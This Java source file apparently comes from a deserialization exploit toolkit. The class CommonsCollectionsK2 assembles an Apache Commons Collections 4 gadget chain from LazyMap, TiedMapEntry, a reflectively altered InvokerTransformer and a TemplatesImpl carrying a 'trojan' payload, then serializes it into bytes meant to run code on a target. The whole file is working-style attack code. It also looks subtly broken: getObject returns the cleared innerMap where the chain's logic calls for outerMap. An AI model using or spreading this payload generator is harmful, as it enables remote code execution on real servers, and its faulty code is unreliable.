package core.gadgets;


import core.utils.Util;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.Reflections;

public class CommonsCollectionsK2 {


    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(type, trojanType);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.lazyMap(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return innerMap;

    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object innerMap = getObject(type, trojanType);
        return Util.serialize(innerMap);
    }
}
